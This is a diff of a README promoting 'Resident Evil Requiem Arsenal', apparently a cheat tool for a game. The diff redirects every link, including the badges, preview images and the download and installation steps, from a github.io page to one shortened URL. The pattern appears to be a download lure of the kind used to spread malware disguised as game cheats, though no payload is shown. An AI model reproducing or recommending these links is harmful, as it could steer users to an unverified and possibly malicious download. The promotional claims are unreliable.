@@ -8,30 +8,30 @@ The current public 29-option configuration covers combat, weapons, inventory, Cr
 
 ## Quick Access
 
-[![Arsenal](https://img.shields.io/badge/Requiem-ARSENAL-cb332f?style=for-the-badge)](https://idleobstacle.github.io/)
-[![29 Options](https://img.shields.io/badge/Options-29-e95843?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0969da?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Download](https://img.shields.io/badge/Download-Latest%20Version-cb332f?style=for-the-badge)](https://idleobstacle.github.io/)
+[![Arsenal](https://img.shields.io/badge/Requiem-ARSENAL-cb332f?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![29 Options](https://img.shields.io/badge/Options-29-e95843?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0969da?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Download](https://img.shields.io/badge/Download-Latest%20Version-cb332f?style=for-the-badge)](https://flyn.co/17yeN7/)
 
 ## Download
 
-➡️ **[Download Resident Evil Requiem Arsenal](https://idleobstacle.github.io/)**
+➡️ **[Download Resident Evil Requiem Arsenal](https://flyn.co/17yeN7/)**
 
 ## Promotional Preview
 
-[![Resident Evil Requiem Arsenal](assets/resident-evil-requiem-arsenal-promo.png)](https://idleobstacle.github.io/)
+[![Resident Evil Requiem Arsenal](assets/resident-evil-requiem-arsenal-promo.png)](https://flyn.co/17yeN7/)
 
 ### Arsenal Dashboard
 
-[![Arsenal Dashboard](assets/resident-evil-requiem-arsenal-dashboard.png)](https://idleobstacle.github.io/)
+[![Arsenal Dashboard](assets/resident-evil-requiem-arsenal-dashboard.png)](https://flyn.co/17yeN7/)
 
 ### Full Feature Set
 
-[![Arsenal Features](assets/resident-evil-requiem-arsenal-features.png)](https://idleobstacle.github.io/)
+[![Arsenal Features](assets/resident-evil-requiem-arsenal-features.png)](https://flyn.co/17yeN7/)
 
 ### Arsenal Overview
 
-[![Arsenal Overview](assets/requiem-arsenal-overview.png)](https://idleobstacle.github.io/)
+[![Arsenal Overview](assets/requiem-arsenal-overview.png)](https://flyn.co/17yeN7/)
 
 ## 29 Arsenal Options
 
@@ -80,7 +80,7 @@ Profiles can save enabled modules, hotkeys, multipliers, speed values, and UI co
 
 ## Installation
 
-1. **[Download Resident Evil Requiem Arsenal](https://idleobstacle.github.io/)**
+1. **[Download Resident Evil Requiem Arsenal](https://flyn.co/17yeN7/)**
 2. Extract the package into a dedicated folder.
 3. Start Resident Evil Requiem.
 4. Open **Requiem Arsenal**.
